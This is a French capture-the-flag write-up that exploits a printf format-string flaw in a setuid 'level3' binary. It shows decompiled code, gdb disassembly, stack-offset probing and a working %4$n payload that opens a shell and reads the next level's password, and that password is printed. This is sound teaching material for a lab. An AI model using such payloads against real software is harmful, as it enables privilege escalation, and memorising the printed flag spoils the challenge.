Je commence par découvrir qui je suis, où je suis, et qu'est-ce qui est à ma disposition :

```
$ id && pwd && ls -la
uid=2022(level3) gid=2022(level3) groups=2022(level3),100(users)
/home/user/level3
total 17
dr-xr-x---+ 1 level3 level3   80 Mar  6  2016 .
dr-x--x--x  1 root   root    340 Sep 23  2015 ..
-rw-r--r--  1 level3 level3  220 Apr  3  2012 .bash_logout
-rw-r--r--  1 level3 level3 3530 Sep 23  2015 .bashrc
-rwsr-s---+ 1 level4 users  5366 Mar  6  2016 level3
-rw-r--r--+ 1 level3 level3   65 Sep 23  2015 .pass
-rw-r--r--  1 level3 level3  675 Apr  3  2012 .profile
```

Je tente de lancer le binaire level3 :

```
$ ./level3

```

Il ne répond qu'avec un input :

```
$ ./level3
da
da
```

J'utilise [Dogbolt](https://dogbolt.org/?id=b1a5a447-06b3-402d-a740-453263922d7a) afin de décompiler le binaire du level 3.

### Ghidra

```c
void v(void) {
  char buffer[520];
  
  fgets(buffer,0x200,stdin);
  printf(buffer);
  if (m == 0x40) {
    fwrite("Wait what?!\n",1,0xc,stdout);
    system("/bin/sh");
  }
  return;
}

void main(void) {
  v();
  return;
}
```

### Hexray

```c
int v() {
  int result; // eax
  char s[520]; // [esp+10h] [ebp-208h] BYREF

  fgets(s, 512, stdin);
  printf(s);
  result = m;
  if ( m == 64 )
  {
    fwrite("Wait what?!\n", 1u, 0xCu, stdout);
    return system("/bin/sh");
  }
  return result;
}
```

Ici, il semble être question de modifier la valeur de `m` dans le code afin de passer le `if` et ouvrir un shell.

Je note que `fgets()` n'est pas la source de vulnérabilité car c'est une version protégée de `gets()` mais que `printf()`, qui lit notre input et l'imprime, présente une vulnérabilité possible connue sous le nom de [Format String Attack](https://owasp.org/www-community/attacks/Format_string_attack).

Il s'agit ici d'utiliser le flag de conversion `%n` :

```
Parameters 	Output 	                                        Passed as
...         ...                                             ...
%n 	        Writes the number of characters into a pointer 	Reference
```

Il me faut donc, dans l'espace qui m'est fourni par le buffer et la limite de `fgets()`, écrire à l'adresse de la variable `m`.

Pour cela, je dois composer un payload infecté composé de :

- l'adresse de la variable `m` dans la fonction `v()`
- 64 caractères à écrire que %n va utiliser pour écrire le pointeur
- puis l'appel à `%n`

Etant donné que nous ne passons aucun argument à `printf`, ce dernier va lire la stack comme argument. Pour trouver "où" se trouve le pointeur de la variable `m` dans la stack pour `printf` lorsque je lui passe l'adresse de `m`, j'utilise l'astuce suivante :

```
$ python -c 'print("a %x %x %x %x %x %x")' | ./level3
a 200 b7fd1ac0 b7ff37d0 78252061 20782520 25207825
                               ^

$ python -c 'print("b %x %x %x %x %x %x")' | ./level3
b 200 b7fd1ac0 b7ff37d0 78252062 20782520 25207825
                               ^
```

J'identifie que le 4eime argument dans l'appel de `printf` représente le 'premier' dans la string passé à `printf`.

Cela m'indique que l'appel à `%n` nécessitera un 'shift' de 4 (écrit: `%4$n`) pour signifier que les 64 bytes écrit avant cet appel doivent être stocké dans le "4eime" argument, qui sera en fait l'adresse de la variable 'm', j'illustre ce propos avec le payload suivant :

```python
python -c 'print("\x08\x04\x98\x8c"[::-1] + "\x90"*60 + "%4$n"
```

Note: vu que j'écris déjà 4 bytes pour l'adresse de 'm', je n'ai donc que 60 à écrire avant pour atteindre le total de 64 bytes, et ce sera la valeur écrite donc dans le "4eime" (1er dans printf) argument, qui pointe donc sur : `0x0804988c`

Cette adresse est trouvée en utilisant `gdb` :

```
(gdb) disas v
Dump of assembler code for function v:
...
   0x080484d5 <+49>:    call   0x8048390 <printf@plt> <- on observe le printf
   0x080484da <+54>:    mov    0x804988c,%eax <- met l'adresse de m dans %eax
   0x080484df <+59>:    cmp    $0x40,%eax <- compare %eax a 0x40 -> 64
...
```

J'exécute mon payload :

```
$ (python -c 'print("\x08\x04\x98\x8c"[::-1] + "\x90"*60 + "%4$n")' && echo 'cat /home/user/level4/.pass') | ./level3
�������������������������������������������������������������
Wait what?!
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```